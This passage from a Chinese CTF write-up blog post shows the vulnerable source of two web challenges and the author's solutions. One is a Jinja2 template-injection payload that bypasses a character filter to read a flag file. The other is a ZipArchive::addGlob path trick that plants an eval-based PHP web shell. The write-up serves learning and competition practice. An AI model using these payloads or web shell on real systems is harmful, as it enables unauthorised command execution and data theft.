+<span class="line"><span style="color:#E1E4E8">    random_str </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">'PHP/7.3.33'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'PHP/7.4'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'PHP/7.2'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'PHP/8.2'</span><span style="color:#E1E4E8">]</span></span>
+<span class="line"><span style="color:#E1E4E8">    response.headers[</span><span style="color:#9ECBFF">'X-Powered-By'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> random.choice(random_str)</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> response</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> check</span><span style="color:#E1E4E8">(s):</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-86550-heterogeneous</span></span>
+<span class="line"><span style="color:#6A737D">    # print(len(s))</span></span>
+<span class="line"><span style="color:#6A737D">    # if len(s) > 131:</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#79B8FF"> len</span><span style="color:#E1E4E8">(s) </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 478</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">        abort(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'u are hacker'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">        # abort(500, 'hacker len')</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> s:</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">not</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> white_list:</span></span>
+<span class="line"><span style="color:#E1E4E8">            abort(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'u are hacker'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">            # abort(500, 'hacker white')</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> black_list:</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> s:</span></span>
+<span class="line"><span style="color:#E1E4E8">            abort(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'u are hacker'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">            # abort(500, 'hacker black')</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-26568-heterogeneous</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">@app.route</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> redirectIndex</span><span style="color:#E1E4E8">():</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> redirect(</span><span style="color:#9ECBFF">'/index.php'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">302</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#B392F0">@app.route</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/index.php'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">methods</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">'GET'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'POST'</span><span style="color:#E1E4E8">])</span></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> hello_world</span><span style="color:#E1E4E8">():</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-7691-heterogeneous</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-50975-heterogeneous</span></span>
+<span class="line"><span style="color:#E1E4E8">    template </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '''</span></span>
+<span class="line"><span style="color:#9ECBFF">            &#x3C;h1>用户登记系统&#x3C;/h1></span></span>
+<span class="line"><span style="color:#9ECBFF">            &#x3C;form method='POST'></span></span>
+<span class="line"><span style="color:#9ECBFF">                &#x3C;label for='name''输入用户名称:'/label></span></span>
+<span class="line"><span style="color:#9ECBFF">                &#x3C;input type='text' id='name' name='name'></span></span>
+<span class="line"><span style="color:#9ECBFF">                &#x3C;input type='submit' value='Submit'></span></span>
+<span class="line"><span style="color:#9ECBFF">            &#x3C;/form&#x3C;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#9ECBFF">            {% if name %}</span></span>
+<span class="line"><span style="color:#9ECBFF">                &#x3C;p>您好, {{ name }} 已登记!&#x3C;/p></span></span>
+<span class="line"><span style="color:#9ECBFF">            {% endif %}</span></span>
+<span class="line"><span style="color:#9ECBFF">        '''</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> request.method </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'POST'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">        try</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">            print</span><span style="color:#E1E4E8">(request.form)</span></span>
+<span class="line"><span style="color:#E1E4E8">            name </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> request.form.get(</span><span style="color:#9ECBFF">'name'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        except</span><span style="color:#79B8FF"> Exception</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> render_template_string(</span><span style="color:#9ECBFF">'&#x3C;h1>需要name参数&#x3C;/h1>'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> name </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-81766-heterogeneous</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#E1E4E8"> render_template_string(</span><span style="color:#9ECBFF">'&#x3C;h1>请输入用户名!&#x3C;/h1>'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">        check(name)</span></span>
+<span class="line"><span style="color:#E1E4E8">        template </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '&#x3C;h1>您好, </span><span style="color:#79B8FF">{}</span><span style="color:#9ECBFF">已登记!!&#x3C;/h1>'</span><span style="color:#E1E4E8">.format(name)</span></span>
+<span class="line"><span style="color:#E1E4E8">        res </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> render_template_string(template)</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#9ECBFF"> 'flag'</span><span style="color:#F97583"> in</span><span style="color:#E1E4E8"> res:</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-31218-heterogeneous</span></span>
+<span class="line"><span style="color:#E1E4E8">            abort(</span><span style="color:#79B8FF">500</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'u are hacker'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">#mimic-defense-55651-heterogeneous</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> res</span></span>
+<span class="line"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> render_template_string(template)</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#79B8FF"> __name__</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> '__main__'</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#E1E4E8">    app.run(</span><span style="color:#FFAB70">host</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'0.0.0.0'</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">debug</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<p>通过测试发现只有这几个 <code>()_-{}."[]=/</code> 符号可以使用，另外 <code>os</code> 模块被过滤，我们直接通过 <code>__builtins__</code> 绕过后通过数组一位一位的读取，具体 Payload 如下，写脚本去遍历即可，同时测试发现前 <code>570</code> 位均为垃圾字符，可以从 <code>570</code> 开始爆破</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E1E4E8">{{[].</span><span style="color:#79B8FF">__class__</span><span style="color:#E1E4E8">.__base__.</span><span style="color:#79B8FF">__subclasses__</span><span style="color:#E1E4E8">()[</span><span style="color:#79B8FF">103</span><span style="color:#E1E4E8">].</span><span style="color:#79B8FF">__init__</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__globals__</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">__builtins__</span><span style="color:#E1E4E8">[</span><span style="color:#9ECBFF">"open"</span><span style="color:#E1E4E8">](</span><span style="color:#9ECBFF">"/tmp/fla""g"</span><span style="color:#E1E4E8">).read()[位数]}}</span></span></code></pre>
+<p>爆破最终得到，很明显缺位，根据语义补上一个 <code>n}</code> 发现没问题</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>flag{u_win_have_fu</span></span></code></pre>
+<h2 id="web">Web</h2>
+<h3 id="noumisotuitennnoka">noumisotuitennnoka</h3>
+<blockquote>
+<p>noumisotuitennnoka</p>
+</blockquote>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line"><span style="color:#79B8FF">highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">$dir </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '/tmp'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">$htContent </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> &#x3C;&#x3C;&#x3C;</span><span style="color:#F97583">EOT</span></span>
+<span class="line"><span style="color:#9ECBFF">&#x3C;Files "backdoor.php"></span></span>
+<span class="line"><span style="color:#9ECBFF">    Deny from all</span></span>
+<span class="line"><span style="color:#9ECBFF">&#x3C;/Files></span></span>
+<span class="line"><span style="color:#F97583">EOT</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">$action </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'action'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">??</span><span style="color:#9ECBFF"> 'create'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">$content </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'content'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">??</span><span style="color:#9ECBFF"> '&#x3C;?php echo file_get_contents("/flag");@unlink(__FILE__);'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">$subdir </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'subdir'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">??</span><span style="color:#9ECBFF"> '/jsons'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/</span><span style="color:#F97583">^</span><span style="color:#85E89D;font-weight:bold">\/\.</span><span style="color:#DBEDFF">?[a-z]</span><span style="color:#F97583">+$</span><span style="color:#9ECBFF">/'</span><span style="color:#E1E4E8">, $subdir) </span><span style="color:#F97583">||</span><span style="color:#79B8FF"> strlen</span><span style="color:#E1E4E8">($subdir) </span><span style="color:#F97583">></span><span style="color:#79B8FF"> 10</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"...."</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#E1E4E8">$jsonDir </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $dir </span><span style="color:#F97583">.</span><span style="color:#E1E4E8"> $subdir;</span></span>
+<span class="line"><span style="color:#E1E4E8">$escapeDir </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '/var/www/html'</span><span style="color:#F97583"> .</span><span style="color:#E1E4E8"> $subdir; </span></span>
+<span class="line"><span style="color:#E1E4E8">$archiveFile </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $jsonDir </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> '/archive.zip'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($action </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'create'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line"><span style="color:#6A737D">    // create jsons/api.json</span></span>
+<span class="line"><span style="color:#F97583">    @</span><span style="color:#79B8FF">mkdir</span><span style="color:#E1E4E8">($jsonDir);</span></span>
+<span class="line"><span style="color:#79B8FF">    file_put_contents</span><span style="color:#E1E4E8">($jsonDir</span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> '/backdoor.php'</span><span style="color:#E1E4E8">, $content);</span></span>
+<span class="line"><span style="color:#79B8FF">    file_put_contents</span><span style="color:#E1E4E8">($jsonDir</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">'/.htaccess'</span><span style="color:#E1E4E8">,$htContent);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($action </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'zip'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line"><span style="color:#79B8FF">    delete</span><span style="color:#E1E4E8">($archiveFile);</span></span>
+<span class="line"><span style="color:#6A737D">    // create archive.zip</span></span>
+<span class="line"><span style="color:#E1E4E8">    $dev_dir </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'dev'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">??</span><span style="color:#E1E4E8"> $dir;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">realpath</span><span style="color:#E1E4E8">($dev_dir) </span><span style="color:#F97583">!==</span><span style="color:#E1E4E8"> $dir)</span></span>
+<span class="line"><span style="color:#F97583">        die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'...'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> ZipArchive</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">open</span><span style="color:#E1E4E8">($archiveFile, </span><span style="color:#79B8FF">ZipArchive</span><span style="color:#F97583">::</span><span style="color:#79B8FF">CREATE</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">addGlob</span><span style="color:#E1E4E8">($jsonDir </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> '/**'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, [</span><span style="color:#9ECBFF">'add_path'</span><span style="color:#F97583"> =></span><span style="color:#9ECBFF"> 'var/www/html/'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'remove_path'</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> $dev_dir]);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">addGlob</span><span style="color:#E1E4E8">($jsonDir </span><span style="color:#F97583">.</span><span style="color:#9ECBFF"> '/.htaccess'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, [</span><span style="color:#9ECBFF">'add_path'</span><span style="color:#F97583"> =></span><span style="color:#9ECBFF"> 'var/www/html/'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'remove_path'</span><span style="color:#F97583"> =></span><span style="color:#E1E4E8"> $dev_dir]);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">close</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($action </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'unzip'</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#79B8FF"> is_file</span><span style="color:#E1E4E8">($archiveFile)){</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> ZipArchive</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">open</span><span style="color:#E1E4E8">($archiveFile);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">extractTo</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'/'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    $zip</span><span style="color:#F97583">-></span><span style="color:#B392F0">close</span><span style="color:#E1E4E8">();</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($action </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> 'clean'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">file_exists</span><span style="color:#E1E4E8">($escapeDir))</span></span>
+<span class="line"><span style="color:#79B8FF">        delete</span><span style="color:#E1E4E8">($escapeDir);</span></span>
+<span class="line"><span style="color:#F97583">    else</span></span>
+<span class="line"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "Failed.(/var/www/html)"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">file_exists</span><span style="color:#E1E4E8">($jsonDir))</span></span>
+<span class="line"><span style="color:#79B8FF">        delete</span><span style="color:#E1E4E8">($jsonDir);</span></span>
+<span class="line"><span style="color:#F97583">    else</span></span>
+<span class="line"><span style="color:#79B8FF">        echo</span><span style="color:#9ECBFF"> "Failed.(/tmp)"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">function</span><span style="color:#B392F0"> delete</span><span style="color:#E1E4E8">($path){</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">is_file</span><span style="color:#E1E4E8">($path))</span></span>
+<span class="line"><span style="color:#F97583">        @</span><span style="color:#79B8FF">unlink</span><span style="color:#E1E4E8">($path);</span></span>
+<span class="line"><span style="color:#F97583">    elseif</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">is_dir</span><span style="color:#E1E4E8">($path)) </span></span>
+<span class="line"><span style="color:#F97583">        @</span><span style="color:#79B8FF">rmdir</span><span style="color:#E1E4E8">($path);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>利用 <code>PHP ZipArchive::addGlob</code>即可，具体参考 <a href="https://blog.tyage.net/archive/p944.html">嘘つきPHP ZipArchive::addGlobと壊れたファイルパス</a>，最后访问 <code>backdoor.php</code> 即可执行命令</p>
+<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>?action=create&#x26;subdir=/sh&#x26;content=&#x3C;?php eval($_GET[1]);&#x26;dev=/tmp//</span></span>
+<span class="line"><span>?action=zip&#x26;subdir=/sh&#x26;content=&#x3C;?php eval($_GET[1]);&#x26;dev=/tmp//</span></span>
+<span class="line"><span>?action=unzip&#x26;subdir=/sh&#x26;content=&#x3C;?php eval($_GET[1]);&#x26;dev=/tmp//</span></span>
+<span class="line"><span>?action=clean&#x26;subdir=/.htaccess&#x26;content=&#x3C;?php eval($_GET[1]);&#x26;dev=/tmp//</span></span></code></pre>   </div> <div class="mt-12 pt-8 border-t border-gray-200"> <div class="bg-gray-50 p-6 rounded-lg text-sm text-gray-700 leading-relaxed relative overflow-hidden">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"> <path fill="#4a4a4a" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10"> <div class="mb-2"> <strong class="text-gray-900">本文作者：</strong> <span>iami233</span> </div> <div class="mb-2"> <strong class="text-gray-900">本文链接：</strong> <a href="https://5ime.cn/mimic-2023/" title="https://5ime.cn/mimic-2023/" target="_blank" rel="noopener" class="text-blue-600 hover:text-blue-800 break-all"> https://5ime.cn/mimic-2023/ </a> </div> <div> <strong class="text-gray-900">版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank" rel="external nofollow noopener noreferrer" class="text-blue-600 hover:text-blue-800">
+CC BY-NC-SA 3.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> <div id="waline" data-astro-cid-cjuph4ok></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.BRmPG2zJ.js"></script>  </div>  </div> <script type="module" src="/_astro/Fancybox.astro_astro_type_script_index_0_lang.DeGMrsLV.js"></script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-[rgb(var(--gray))] bg-gradient-to-b from-transparent to-[rgb(var(--gray-gradient))]">
+&copy; 2025 iami233. All rights reserved.
+</footer> <script type="module" src="/_astro/BlogPost.astro_astro_type_script_index_1_lang.znP5JH7M.js"></script></body></html>
